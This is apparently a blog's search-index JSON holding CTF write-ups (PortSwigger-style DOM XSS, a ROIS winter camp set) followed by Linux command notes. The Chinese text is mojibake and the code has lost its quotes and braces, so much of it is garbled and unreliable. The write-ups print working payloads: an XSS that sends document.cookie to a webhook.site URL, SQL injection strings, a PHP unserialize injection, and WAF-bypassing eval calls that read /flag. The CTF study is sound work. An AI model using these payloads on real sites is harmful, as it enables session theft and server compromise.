Labï¼šå­˜å‚¨çš„ DOM XSSæŒ‰ç…§ä¸Šä¸€é¢˜çš„æ€è·¯æ¥åšï¼ŒåŒæ ·çš„è¯„è®ºéƒ¨åˆ†éƒ½ä¸ºjsonæ–‡ä»¶ï¼Œè§‚å¯Ÿåˆ°nameä½äºæœ€åçš„ä½ç½®ï¼Œäºæ˜¯æŒ‰ç…§ä¸Šé¢˜åœ¨nameè¾“å…¥æ¡†å¯ä»¥è¿™æ ·å†™ï¼šxss\\-alert(1)]//ï¼Œå›è½¦ä¹‹åå‘ç°å¹¶æ²¡æœ‰å¥æ•ˆ æ£€æŸ¥å“åº”ï¼Œå‘ç°ç»™\\åˆ†åˆ«éƒ½åšäº†è½¬ä¹‰å¤„ç†ï¼Œäºæ˜¯å¤±è´¥äº† æŸ¥çœ‹é¢˜è§£ï¼Œpayloadæ˜¯å†™åœ¨è¯„è®ºçš„å†…å®¹ä¸­ï¼šimg src=1 onerror=alert(1)ï¼Œå›è½¦åç‚¹è¿”å›åˆ°åšæ–‡ï¼ŒæˆåŠŸå¼¹çª—ï¼Œé¢˜ç›®è§£å†³ æ ¹æ®é¢˜è§£æ‰€è¯´ï¼Œè¿™æ ·å­ä¹‹æ‰€ä»¥å¯ä»¥å¥æ•ˆæ˜¯å› ä¸ºä¸ºäº†é˜²æ­¢ XSSï¼Œè¯¥ç½‘ç«™ä½¿ç”¨ JavaScript replace() å‡½æ•°å¯¹å°–æ‹¬å·è¿›è¡Œç¼–ç ã€‚ä½†æ˜¯ï¼Œå½“ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å­—ç¬¦ä¸²æ—¶ï¼Œè¯¥å‡½æ•°ä»…æ›¿æ¢ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹ã€‚æˆ‘ä»¬åˆ©ç”¨æ­¤æ¼æ´åªéœ€åœ¨è¯„è®ºçš„å¼€å¤´æ·»åŠ ä¸€ç»„é¢å¤–çš„å°–æ‹¬å·å³å¯ã€‚è¿™äº›å°–æ‹¬å·å°†è¢«ç¼–ç ï¼Œä½†ä»»ä½•åç»­çš„å°–æ‹¬å·éƒ½ä¸ä¼šå—åˆ°å½±å“ï¼Œä½¿æˆ‘ä»¬èƒ½å¤Ÿæœ‰æ•ˆåœ°ç»•è¿‡è¿‡æ»¤å™¨å¹¶æ³¨å…¥ HTML","tags":["xss"],"categories":["CTF"]},{"title":"ROISå†¬ä»¤è¥é¢˜è§£","path":"/2024/01/30/ROISå†¬ä»¤è¥é¢˜è§£_max/ROISå†¬ä»¤è¥é¢˜è§£/","content":"1.httpï¼ˆæå®¢å¤§æŒ‘æˆ˜ï¼‰é¦–å…ˆæŸ¥çœ‹æºç å‘ç° a style=border:none;cursor:default; onclick=return false href=Secret.phpï¼Œç‚¹å‡»è¯¥é“¾æ¥ ç„¶åé€šè¿‡é¡µé¢ä¿¡æ¯ä¿®æ”¹refererï¼šhttps://Sycsecret.buuoj.cn æ¥ç€æµè§ˆå™¨ä¿¡æ¯ï¼Œå³ User-Agent:Sycloverï¼Œç„¶åå‘Šè¯‰æˆ‘ä»¬è¦ä»æœ¬åœ°æŸ¥çœ‹ï¼Œä¸Šç½‘æŸ¥æ‰¾å‘ç°æœ¬åœ°éƒ½æ˜¯è¿™ä¸ªç«¯å£å· 127.0.0.1ï¼Œä¿®æ”¹xxfï¼Œç„¶åflagå°±å‡ºæ¥äº† 2.æŸ¥çœ‹ç½‘é¡µçš„å¤‡ä»½æ–‡ä»¶ï¼ˆæ”»é˜²ä¸–ç•Œï¼‰phpçš„å¤‡ä»½æ–‡ä»¶æœ‰ä¸¤ç§ï¼š*.php~å’Œ*.php.bak ä¾‹å­ï¼šhttp://61.147.171.105:55767/index.php.bak 3.php2ï¼ˆæ”»é˜²ä¸–ç•Œï¼‰å¯¹ç½‘å€åé¢åŠ ä¸Šindex.phpså°±å¯ä»¥æŸ¥çœ‹é¡µé¢phpæºç  ä¾‹å­ï¼šhttp://111.198.29.45:45191/index.phps phpsæ˜¯phpçš„æºä»£ç æ–‡ä»¶ï¼Œä½†æ˜¯ä¸èƒ½æ¥å—ä¼ å‚ï¼Œæ‰€ä»¥hackbarè¿˜æ˜¯è¦åœ¨.phpé‡Œé¢åš 4.cookieï¼ˆæ”»é˜²ä¸–ç•Œï¼‰å¦‚ä½•æŸ¥çœ‹httpå“åº” æ‰“å¼€å¼€å‘è€…å·¥å…·ï¼Œå†ç‚¹å‡»ç½‘ç»œ(network)ï¼Œé€‰æ‹©ä½ æƒ³è¦æŸ¥çœ‹httpå“åº”çš„ç½‘å€ è¿™é“é¢˜çš„flagä½äºæ ‡å¤´é‡Œé¢ 5.æ‰«æç›®å½•ç”¨dirsearchï¼ˆæ”»é˜²ä¸–ç•Œï¼‰dirsearch -u URLæ˜¯è¦æ‰«æçš„ç›®æ ‡ç½‘ç«™çš„URL å¯ä»¥ç”¨ä»¥ä¸‹é€‰é¡¹æ¥è°ƒæ•´æ‰«æï¼š -e:æŒ‡å®šè¦æ’é™¤çš„æ‰©å±•å -f:æŒ‡å®šè¦åŒ…å«çš„æ‰©å±•å -x:æŒ‡å®šè¦æ’é™¤çš„ç›®å½• -t:æŒ‡å®šçº¿ç¨‹æ•° ä¾‹å­ï¼šdirsearch -u https://example.com/ -f php,html -t 50ï¼ˆç”¨50ä¸ªçº¿ç¨‹æ‰«æä¸€ä¸ªURLï¼ŒåªåŒ…æ‹¬.phpå’Œ.htmlæ–‡ä»¶ï¼‰ dirsearch -u https://example.com/ -o result.txt å°†æ‰«æç»“æœä¿å­˜åˆ°result.txtæ–‡ä»¶ä¸­ 6.easy-PDDè¿™é“é¢˜å…ˆç”¨bpæŠ“åŒ…ï¼Œç„¶åç”¨bpä¸­çš„çˆ†ç ´æ¨¡å¼ï¼Œä¹Ÿå°±æ˜¯Intruderæ¨¡å¼æ¥å‘é€å¥½å¤šå¥½å¤šçš„è¯·æ±‚åŒ…ï¼Œå¾—åˆ°flag å…·ä½“çˆ†ç ´æ¨¡å¼æ“ä½œæ­¥éª¤å¯ä»¥å‚è€ƒï¼šhttps://blog.csdn.net/FTQOOO/article/details/103822526 7.ez_mazeåˆ†æï¼šå¼¹å‡ºè­¦å‘Šæ¡†æ˜¯å› ä¸ºé¼ æ ‡çš„ç§»åŠ¨ç¢°åˆ°äº†è¿·å®«çš„çº¿å¯¼è‡´çš„ï¼Œå°±æ˜¯jsä¸­çš„onmouseoveräº‹ä»¶ï¼Œæ‰€ä»¥æœ‰ä»¥ä¸‹å‡ ç§è§£æ³• ç¬¬ä¸€ç§ï¼šç©é€šå…³ï¼Œå®è·µè¿‡å¯ä»¥çš„ï¼Œéš¾åº¦è¿˜è¡Œ ç¬¬äºŒç§ï¼šé€šè¿‡å¼¹å‡ºè­¦å‘Šæ¡†åé¼ æ ‡æ€ä¹ˆç§»åŠ¨éƒ½æ²¡æœ‰äº‹æƒ…ï¼Œå¯ä»¥å€Ÿæ­¤å…ˆæŠŠé¼ æ ‡ç§»è‡³çº¢ç‚¹åŒºåŸŸï¼Œç„¶åæŒ‰å›è½¦é”®ï¼Œå†è§¦ç¢°çº¢ç‚¹å°±å¾—åˆ°flagäº† ç¬¬ä¸‰ç§ï¼šç”¨æ‰‹æœºè¿›å…¥è¿™ä¸ªç½‘å€ï¼Œç„¶åç›´æ¥ç‚¹çº¢ç‚¹ ç¬¬å››ç§ï¼šé€šè¿‡æºç çš„é€»è¾‘æ¥ï¼Œç­‰å¾…æœ‰ç¼˜äººing 8.Matryoshka dollä¸‹è½½æ–‡ä»¶å®ŒåæŠŠé‚£ä¸ªæ–‡ä»¶çš„å†…å®¹ç–¯ç‹‚æ‹¿å»è½¬ç ï¼Œè§£ç ï¼Œéœ€è¦å¤šç§ï¼Œæ¯”å¦‚base64è§£ç ï¼Œurldecodeç­‰ï¼Œå¯ä»¥å€ŸåŠ©gptå¸®å¸®å¿™ 9.ä¸‰é¢˜sqlæ³¨å…¥easyï¼šè´¦å·åä½¿ç”¨ä¸‡èƒ½å¯†é’¥ 1 or 1=1ï¼›ç„¶åå¯†ç éšä¾¿è¾“å…¥ä¸€ä¸ª normalï¼šæŒ‰ç…§æ­£å¸¸çš„unionæ³¨å…¥æ¥è¿›è¡Œæ“ä½œï¼Œéœ€è¦æ³¨æ„çš„æ˜¯åªä¼šå›æ˜¾ç¬¬äºŒä¸ªå­—æ®µï¼Œæ‰€ä»¥æ‰€æœ‰æ“ä½œè¦åœ¨ select 1,2,3çš„2å¤„è¿›è¡Œ hardï¼šä½¿ç”¨å¸ƒå°”ç›²æ³¨ï¼Œæœ€å¥½ä½¿ç”¨è„šæœ¬æ¥ï¼Œå—–å—–çˆ†å‡ºæ‰€éœ€ä¸œè¥¿ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è´¦å·å¯†ç çš„nameå±æ€§åˆ†åˆ«æ˜¯usernameï¼Œpassword 10.xss-1function report() document.location = `http://$document.location.hostname:8001/report.html?e=`+btoa(document.querySelector(#input-textarea).value) function execute(payload) try let parsed = acorn.parse(payload, ecmaVersion: latest ).body; alert(eval(payload)); catch(e) alert(Error: +e); window.onload = _= let p = (new URLSearchParams(document.location.search)).get(e); if(p) execute(atob(p)); ä¸Šè¿°ä»£ç ç†è§£é€å½»å³å¯åšå‡ºé¢˜ç›®ï¼ˆé€å½»ï¼ï¼ï¼ï¼‰ payloadï¼šwindow.open(https://webhook.site/346c0b70-1254-4efc-a539-54c670644ab2?+document.cookie) 11.unserialize-1?php$flag = ROIStest;class Name public $name; public $password; public function __get($name) echo $this-name; return $name; public function __wakeup() if($this-password!=null) echo $this-password; else echo $this-name; public function __toString() global $flag; echo $flag; return nice; unserialize($_GET[input]); __toString()å¿…é¡»åœ¨echoå¯¹è±¡çš„æƒ…å†µä¸‹æ‰èƒ½å¤Ÿè‡ªåŠ¨ä½¿ç”¨ï¼Œæ‰€ä»¥è¦ä¸€ä¸ªå¯¹è±¡è¦åŒ…å«å¦ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸¤ä¸ªå¯¹è±¡åŒå±äºä¸€ä¸ªç±»é‡Œé¢ï¼Œä»£ç å¦‚ä¸‹ ?php$flag = ROIStest;class Name public $name; public $password; public function __construct($name,$password) $this-name = $name; $this-password = $password;$a = new Name(John,222);$input = new Name(Joe,$a);echo serialize($input); åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ï¼šO:4:Name:2:s:4:name;s:3:Joe;s:8:password;O:4:Name:2:s:4:name;s:4:John;s:8:password;s:3:222; ç„¶å ?input=O:4:Name:2:s:4:name;s:3:Joe;s:8:password;O:4:Name:2:s:4:name;s:4:John;s:8:password;s:3:222;ï¼Œå¾—åˆ°flag 12.ez_rce_plus??phphighlight_file(__FILE__);if (@$_SERVER[HTTP_KEY] !== Nzc2NTZjNjU2MzZmNmQ2NTVmNzQ2ZjVmNzI2ZjY5NzMyMQ==) die(authentication failed!!);else $nameFunction = htmlspecialchars(@$_POST[function]); unset($_POST[function]); if(!$nameFunction) $nameFunction = htmlspecialchars(@$_POST[action]); unset($_POST[action]); $nameFunction = waf($nameFunction); $nameFunction = explode(/,$nameFunction); $nameFunction = $nameFunction[1]; if($nameFunction) $params = array(); forEach($_POST as $key = $item) $item = waf($item); array_push($params, $item); unset($_POST[$key]); $base64 = false; if(isset($_SERVER[HTTP_BASE64])) $base64 = $_SERVER[HTTP_BASE64] === true ? true : false; $params = join(,, $params); $eval = $nameFunction.(.$params.); $return = eval(return .$eval.;); echo jsonEncode($return, $base64); function jsonEncode($value, $base64_encode = true) $value = json_encode($value, JSON_PRETTY_PRINT); if($base64_encode) $value = base64_encode($value); return $value;function waf($input) $blacklist = [system, exec, flag]; foreach ($blacklist as $word) $input = str_replace($word, , $input); return $input; æºç çœ‹æ‡‚é‚£å°±ä¸æ˜¯ä¸ªäº‹ unset() å‡½æ•°ç”¨äºé”€æ¯æŒ‡å®šå˜é‡ explode() å‡½æ•°ä¼šå°†å­—ç¬¦ä¸²æŒ‰ç…§æŒ‡å®šçš„åˆ†éš”ç¬¦æ‹†åˆ†æˆæ•°ç»„ forEach($_POST as $key = $item) éå†äº† $_POST æ•°ç»„ä¸­çš„æ¯ä¸ªé”®å€¼å¯¹ï¼Œå…¶ä¸­ $key æ˜¯é”®åï¼Œ$item æ˜¯å¯¹åº”çš„å€¼ã€‚ å¯¹æ¯ä¸ª $item å€¼åº”ç”¨äº† waf() å‡½æ•°è¿›è¡Œè¿‡æ»¤ï¼Œè¿‡æ»¤åçš„ç»“æœå­˜å‚¨å› $item å˜é‡ä¸­ã€‚ ä½¿ç”¨ array_push($params, $item) å°†è¿‡æ»¤åçš„ç»“æœæ·»åŠ åˆ°äº† $params æ•°ç»„ä¸­ã€‚ ä½¿ç”¨ unset($_POST[$key]) åˆ é™¤äº†åŸå§‹ $_POST æ•°ç»„ä¸­ç›¸åº”çš„é”®å€¼å¯¹ï¼Œä»¥ç¡®ä¿åªä¿ç•™äº†è¿‡æ»¤åçš„æ•°æ® ä½¿ç”¨ join() å‡½æ•°å°†æ•°ç»„ $params ä¸­çš„å…ƒç´ ä»¥é€—å·è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶ä¸”åœ¨æ¯ä¸ªå…ƒç´ ä¹‹é—´æ·»åŠ äº†å•å¼•å· ä»¥ä¸‹å†…å®¹ä¸ºåæ¨å›å»çš„æ€è·¯ $eval=system(ls /)$params=ls /$nameFunction=system$nameFunction=1/sysystemstemfunction=action=1/sysystemstema=ls / æ‰€ä»¥æœ€ç»ˆpostçš„å†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼š function=1/sysystemstemaction=1/sysystemstema=ls / å¾—åˆ°flagä½ç½®å function=1/sysystemstemaction=1/sysystemstema=cat /flflagag 13.ez_rce_with_full_waf?ä¸12é¢˜çš„ä»£ç å·®ä¸å¤šï¼Œå…¶ä¸­çš„waf()å‡½æ•°æ”¹ä¸ºäº†ä¸‹é¢æ‰€ç¤ºï¼š function waf($input) $blacklist = [system, exec, flag ,` ,eval ,call ,$ ,php ,require , _ , file ,show , include, \\ , , . , , ]; foreach ($blacklist as $word) $input = str_replace($word, hack!, $input); return $input; æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸ç»™functionèµ‹å€¼ï¼Œç»™actionèµ‹å€¼ç»•è¿‡ç¬¬ä¸€ä¸ªwafï¼šaction=1/systema=ls / ç¬¬äºŒä¸ªwafæˆ‘ä»¬å¯ä»¥é€šè¿‡é€šé…ç¬¦æ¥ç»•è¿‡ï¼šaction=1/sysystemstema=cat /fl??ï¼Œå¾—åˆ°æœ€ç»ˆçš„flag","categories":["Write-Up"]},{"title":"Linuxå‘½ä»¤ç¬”è®°","path":"/2024/01/24/Linuxå‘½ä»¤ç¬”è®°/","content":"çœæµç‰ˆecho:æ‰“å°ä½ ç»™çš„å‚æ•° echo $PATHï¼šè¾“å‡ºç”µè„‘ä¸Šçš„ç›®å½• which å‚æ•°:ä¼šè¾“å‡ºè¿è¡Œå‚æ•°çš„è·¯å¾„ï¼ˆæ¯”å¦‚ï¼šwhich echoï¼‰ pwd:å½“å‰å·¥ä½œç›®å½• cdï¼šæ”¹å˜å½“å‰å·¥ä½œç›®å½•ï¼ˆä¾‹å­ï¼šcd /homeï¼‰ .ï¼šè¡¨ç¤ºå½“å‰ç›®å½•ï¼›..ï¼šè¡¨ç¤ºä¸Šä¸€çº§ç›®å½• ç»™å‡ºè¢«è°ƒç”¨è¿è¡Œçš„ç¨‹åºçš„ç»å¯¹è·¯å¾„ï¼šç¨‹åºå¯ä»¥ç›´æ¥è¿è¡Œèµ·æ¥ lsï¼šåˆ—å‡ºå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ ~ï¼šå¸¦ä½ å›åˆ°ç”¨æˆ·ç›®å½•ï¼ˆåœ¨cdå‘½ä»¤ä¸‹é¢ä½¿ç”¨ï¼‰ cd -ï¼šå°†å½“å‰ç›®å½•è·³è½¬åˆ°ä½ æ‰€å¤„çš„ä¸Šä¸€ä¸ªç›®å½• â€“helpï¼šä¼šå‘Šè¯‰ä½ è¿™ä¸ªå‘½ä»¤æ€ä¹ˆç”¨ï¼ˆls --helpï¼‰ mv:é‡å‘½åæ–‡ä»¶ï¼Œæ¥å—ä¸¤ä¸ªè·¯å¾„ï¼Œå…ˆæ˜¯åŸæœ‰çš„ï¼Œç„¶åæ˜¯æ–°çš„ï¼›ä¹Ÿå¯ä»¥æŠŠæ–‡ä»¶ç§»åˆ°ä¸åŒçš„ç›®å½• mv dotfiles.md foo.md cpï¼šå¤åˆ¶æ–‡ä»¶ï¼Œä¸¤ä¸ªè·¯å¾„ï¼ˆå¤åˆ¶æºè·¯å¾„å’Œç›®æ ‡è·¯å¾„ï¼Œéƒ½è¦æ˜¯å®Œæ•´è·¯å¾„ï¼Œä½†ä¸å¿…æ˜¯åŒä¸€ä¸ªç›®å½•ï¼‰ cp dotfile.md ../food.md rmï¼šç§»é™¤ä¸€ä¸ªæ–‡ä»¶ï¼Œä¸èƒ½æ˜¯ç›®å½• rmdirï¼šåªå…è®¸ç§»é™¤ç©ºç›®å½• mkdirï¼šåˆ›å»ºä¸€ä¸ªæ–°ç›®å½• Ctrl+lï¼šæ¸…ç©ºç»ˆç«¯ï¼Œè®©å…‰æ ‡å›åˆ°é¡¶éƒ¨ :é‡å®šå‘è¿™ä¸ªç¨‹åºçš„è¾“å…¥æµ å¤§äºå·ï¼šé‡å®šå‘è¿™ä¸ªç¨‹åºçš„è¾“å…¥æµ echo hello hello.txtï¼šæŠŠhelloè¾“å…¥hello.txtæ–‡ä»¶ä¸­å» cat:æ‰“å°ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼ˆcatä¹Ÿæ”¯æŒè¾“å…¥æµå’Œè¾“å‡ºæµï¼‰ cat hello.txtæ„æ€æ˜¯æŠŠhello.txté‡Œé¢çš„å†…å®¹ä½œä¸ºcatçš„è¾“å…¥ï¼ŒæŠŠè¿™äº›å†…å®¹è¾“å‡ºåˆ°ç»ˆç«¯cat hello.txt hello2.txthello.txté‡Œé¢çš„å†…å®¹ä½œä¸ºcatçš„è¾“å…¥ï¼ŒæŠŠè¿™äº›å†…å®¹å­˜åˆ°hello2.txtæ–‡ä»¶ä¸­ ï¼šè¿½åŠ è€Œä¸æ˜¯è¦†å†™ cat hello.txt hello2.txtå½“hello2.txtæ–‡ä»¶ä¸­å·²ç»æœ‰helloæ—¶ä¼šå†åŠ ä¸Šä¸€ä¸ªhello |ï¼šå»å·¦ä¾§ç¨‹åºçš„è¾“å‡ºåšå³è¾¹ç¨‹åºçš„è¾“å…¥ tail:æ‰“å°å‡ºè¾“å…¥çš„æœ€ånè¡Œ ls -l / | tail -n1æ‰“å°æœ€åä¸€è¡Œçš„å†…å®¹ sudo+å¹³å¸¸çš„å‘½ä»¤ï¼šä¼šä»¥rootçš„èº«ä»½è¿è¡Œè¿™ä¸ªå‘½ä»¤ sudo suï¼šæ¥ä¸‹æ¥ä»¥rootè¿è¡Œæ¥ä¸‹æ¥çš„å‘½ä»¤ æ–‡ä»¶æƒé™ä½åŒ…æ‹¬è¯»å–ï¼ˆreadï¼‰ã€å†™å…¥ï¼ˆwriteï¼‰å’Œæ‰§è¡Œï¼ˆexecuteï¼‰æƒé™ã€‚ è¯»å–æƒé™ï¼ˆrï¼‰å…è®¸ç”¨æˆ·æŸ¥çœ‹æ–‡ä»¶å†…å®¹å’Œå±æ€§ã€‚ å†™å…¥æƒé™ï¼ˆwï¼‰å…è®¸ç”¨æˆ·ä¿®æ”¹æ–‡ä»¶å†…å®¹å’Œå±æ€§ã€‚ æ‰§è¡Œæƒé™ï¼ˆxï¼‰å…è®¸ç”¨æˆ·ä»¥å¯æ‰§è¡Œæ–‡ä»¶çš„å½¢å¼è¿è¡Œæ–‡ä»¶ï¼ˆä¾‹å¦‚ï¼Œè„šæœ¬æˆ–å¯æ‰§è¡Œç¨‹åºï¼‰æˆ–è¿›å…¥ç›®å½•ã€‚ æ¯ä¸ªæ–‡ä»¶éƒ½æœ‰ä¸‰ç»„æƒé™ä½ï¼Œåˆ†åˆ«å¯¹åº”æ–‡ä»¶çš„æ‰€æœ‰è€…ã€ç”¨æˆ·ç»„å’Œå…¶ä»–ç”¨æˆ·ã€‚ ç²¾è‡´ç‰ˆå‰ç½®çŸ¥è¯†1.ç›®å½•ç¬¦å·/ è¡¨ç¤ºä» æ ¹ç›®å½• ~è¡¨ç¤ºä» å®¶ç›®å½•(å³homeç”¨æˆ·åï¼Œrootç”¨æˆ·ä¸º/root) . ä»£è¡¨å½“å‰ç›®å½• .. ä»£è¡¨ä¸Šä¸€çº§ç›®å½• 2.ç»å¯¹ç›®å½•ä¸ç›¸å¯¹ç›®å½•ç›¸å¯¹è·¯å¾„ åœ¨è¾“å…¥è·¯å¾„æ—¶ï¼Œä½¿ç”¨.æˆ–è€…..ï¼Œè¡¨ç¤ºç›¸å¯¹ å½“å‰ç›®å½• æ‰€åœ¨çš„ç›®å½•ä½ç½® ç»å¯¹è·¯å¾„ åœ¨è¾“å…¥è·¯å¾„æ—¶ï¼Œæœ€å‰é¢æ˜¯ æˆ–è€… ~ï¼Œè¡¨ç¤ºä» æ ¹ç›®å½•å®¶ç›®å½• å¼€å§‹çš„å…·ä½“ç›®å½•ä½ç½®ï¼Œç‰¹ç‚¹ï¼šéœ€è¦å†™å…¥å®Œæ•´åœ°å€ 3. å’Œ é‡å®šå‘ å‘½ä»¤åŠŸèƒ½ï¼šå°†å‘½ä»¤æ‰§è¡Œç»“æœé‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œå°†æœ¬åº”æ˜¾ç¤ºåœ¨ç»ˆç«¯ä¸Šçš„å†…å®¹ è¾“å‡ºæˆ–è¿½åŠ  åˆ°æŒ‡å®šæ–‡ä»¶ä¸­ è¡¨ç¤ºè¾“å‡ºï¼Œä¼šè¦†ç›–æ–‡ä»¶åŸæœ‰çš„å†…å®¹ è¡¨ç¤ºè¿½åŠ ï¼Œä¼šå°†å†…å®¹è¿½åŠ åˆ°å·²æœ‰æ–‡ä»¶çš„æœ«å°¾ 4.|ç®¡é“ç¬¦ Linux å…è®¸å°† ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡º å¯ä»¥é€šè¿‡ç®¡é“| åšä¸º å¦ä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥ è¿™é‡Œ | çš„å·¦å³åˆ†ä¸ºä¸¤ç«¯ï¼Œ å·¦ç«¯å¡ä¸œè¥¿ï¼ˆå†™ï¼‰ï¼Œå³ç«¯å–ä¸œè¥¿ï¼ˆè¯»ï¼‰ pwd å‘½ä»¤å¯¹åº”å•è¯ï¼šprint working directory åŠŸèƒ½ï¼šæ‰“å°å½“å‰å·¥ä½œç›®å½• ls å‘½ä»¤å¯¹åº”å•è¯ï¼šlist åŠŸèƒ½ï¼šåˆ—å‡ºç›®å½•çš„å†…å®¹æˆ–è€…ä½¿ç”¨é€šé…ç¬¦åˆ—å‡ºæ–‡ä»¶ååŒ¹é…çš„æ–‡ä»¶ æ ¼å¼: SHELLls [å‚æ•°] å¯é€‰å‚æ•° -a æ˜¾ç¤ºæŒ‡å®šç›®å½•ä¸‹æ‰€æœ‰ç›®å½•ä¸æ–‡ä»¶ï¼ŒåŒ…æ‹¬éšè—æ–‡ä»¶ -l ä»¥åˆ—è¡¨æ–¹å¼æ˜¾ç¤ºæ–‡ä»¶çš„è¯¦ç»†ä¿¡æ¯ -h é…åˆ -l ä»¥äººæ€§åŒ–çš„æ–¹å¼æ˜¾ç¤ºæ–‡ä»¶å¤§å° æ³¨æ„ï¼šä»¥ . å¼€å¤´çš„æ–‡ä»¶ä¸ºéšè—æ–‡ä»¶ï¼Œéœ€è¦ç”¨ -a å‚æ•°æ‰èƒ½æ˜¾ç¤º find å‘½ä»¤å¯¹åº”å•è¯ï¼šfind åŠŸèƒ½ï¼šæŒ‡å®šç›®å½•åŠå…¶å­ç›®å½•ä¸‹æŸ¥æ‰¾æ–‡ä»¶å’Œç›®å½• æ ¼å¼ PLAINTEXTfind [è·¯å¾„] [åŒ¹é…æ¡ä»¶] [åŠ¨ä½œ] å¸¸ç”¨çš„åŒ¹é…æ¡ä»¶ï¼š å¯é€‰åŒ¹é…æ¡ä»¶ ä½œç”¨ -name æŒ‰æ–‡ä»¶åæŸ¥æ‰¾ï¼Œæ”¯æŒä½¿ç”¨é€šé…ç¬¦ * å’Œ ? -type æŒ‰æ–‡ä»¶ç±»å‹æŸ¥æ‰¾ï¼Œå¯ä»¥æ˜¯ fï¼ˆæ™®é€šæ–‡ä»¶ï¼‰ã€dï¼ˆç›®å½•ï¼‰ã€lï¼ˆç¬¦å·é“¾æ¥ï¼‰ç­‰ã€‚ -size[+-] æŒ‰æ–‡ä»¶å¤§å°æŸ¥æ‰¾ï¼Œæ”¯æŒä½¿ç”¨ + æˆ– - è¡¨ç¤ºå¤§äºæˆ–å°äºæŒ‡å®šå¤§å°ï¼Œå•ä½å¯ä»¥æ˜¯ cï¼ˆå­—èŠ‚ï¼‰ã€wï¼ˆå­—æ•°ï¼‰ã€bï¼ˆå—æ•°ï¼‰ã€kï¼ˆKBï¼‰ã€Mï¼ˆMBï¼‰æˆ– Gï¼ˆGBï¼‰ã€‚ -mtime æŒ‰ä¿®æ”¹æ—¶é—´æŸ¥æ‰¾ï¼Œæ”¯æŒä½¿ç”¨ + æˆ– - è¡¨ç¤ºåœ¨æŒ‡å®šå¤©æ•°å‰æˆ–åï¼Œdays æ˜¯ä¸€ä¸ªæ•´æ•°è¡¨ç¤ºå¤©æ•°ã€‚ -user æŒ‰æ–‡ä»¶æ‰€æœ‰è€…æŸ¥æ‰¾ã€‚ -group æŒ‰æ–‡ä»¶æ‰€å±ç»„æŸ¥æ‰¾ã€‚ cd å‘½ä»¤å¯¹åº”å•è¯ï¼šchange directory åŠŸèƒ½ï¼šæ›´æ”¹å½“å‰çš„å·¥ä½œç›®å½• æ ¼å¼: SHELLcd ç›®å½• cdæ­é…ç¬¦å· å‘½ä»¤ å«ä¹‰ cd cd ~ åˆ‡æ¢åˆ°å½“å‰ç”¨æˆ·çš„ä¸»ç›®å½•(homeç”¨æˆ·ç›®å½•) cd . ä¿æŒåœ¨å½“å‰ç›®å½•ä¸å˜ cd .. åˆ‡æ¢åˆ°ä¸Šçº§ç›®å½• cd â€“ å¯ä»¥åœ¨æœ€è¿‘ä¸¤æ¬¡å·¥ä½œç›®å½•ä¹‹é—´æ¥å›åˆ‡æ¢ touchå‘½ä»¤åŠŸèƒ½ï¼š å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªç©ºç™½æ–‡ä»¶ å¦‚æœæ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œå¯ä»¥ä¿®æ”¹æ–‡ä»¶çš„æœ«æ¬¡ä¿®æ”¹æ—¥æœŸ mkdirå‘½ä»¤å¯¹åº”å•è¯ï¼šmake directory åŠŸèƒ½ï¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ç›®å½• é€‰é¡¹ å«ä¹‰ -p åˆ›å»ºå¤šçº§ç›®å½• éœ€è¦åˆ›å»ºä¸€ä¸ªç›®å½•çš„åŒæ—¶ï¼Œä¹Ÿéœ€è¦åˆ›å»ºå…¶ä¸Šçº§ç›®å½•ï¼ˆå¦‚æœä¸Šçº§ç›®å½•ä¸å­˜åœ¨ï¼‰ æ³¨æ„ï¼šæ–°å»ºç›®å½•çš„åç§° ä¸èƒ½ä¸å½“å‰ç›®å½•ä¸­ å·²æœ‰çš„ç›®å½•åŒå rmå‘½ä»¤å¯¹åº”å•è¯ï¼šremove åŠŸèƒ½ï¼šåˆ é™¤æ–‡ä»¶æˆ–ç›®å½• å¯é€‰å‚æ•° å«ä¹‰ -f å¼ºåˆ¶åˆ é™¤ï¼Œå¿½ç•¥ä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œæ— éœ€æç¤º -r é€’å½’åœ°åˆ é™¤ç›®å½•ä¸‹çš„å†…å®¹ï¼Œåˆ é™¤æ–‡ä»¶å¤¹æ—¶å¿…é¡»åŠ æ­¤å‚æ•° cpå‘½ä»¤å¯¹åº”å•è¯ï¼šcopy åŠŸèƒ½ï¼šå¤åˆ¶æ–‡ä»¶æˆ–è€…ç›®å½• å¯é€‰å‚æ•° å«ä¹‰ -i è¦†ç›–æ–‡ä»¶å‰æç¤º -r è‹¥ç»™å‡ºçš„æºæ–‡ä»¶æ˜¯ç›®å½•æ–‡ä»¶ï¼Œåˆ™ cp å°†é€’å½’å¤åˆ¶è¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰å­ç›®å½•å’Œæ–‡ä»¶ï¼Œç›®æ ‡æ–‡ä»¶å¿…é¡»ä¸ºä¸€ä¸ªç›®å½•å mvå‘½ä»¤å¯¹åº”å•è¯ï¼šmove åŠŸèƒ½ï¼šç§»åŠ¨æ–‡ä»¶æˆ–è€…ç›®å½•ï¼æ–‡ä»¶æˆ–è€…ç›®å½•é‡å‘½å å¯é€‰å‚æ•° å«ä¹‰ -i è¦†ç›–æ–‡ä»¶å‰æç¤º catå‘½ä»¤å¯¹åº”å•è¯ï¼š concatenate åŠŸèƒ½ï¼šæŸ¥çœ‹æ–‡ä»¶å†…å®¹ã€åˆ›å»ºæ–‡ä»¶ã€æ–‡ä»¶åˆå¹¶ã€è¿½åŠ æ–‡ä»¶å†…å®¹ç­‰åŠŸèƒ½.,é€‚åˆæŸ¥çœ‹å†…å®¹è¾ƒå°‘çš„æ–‡æœ¬æ–‡ä»¶ å¯é€‰å‚æ•° å«ä¹‰ -b 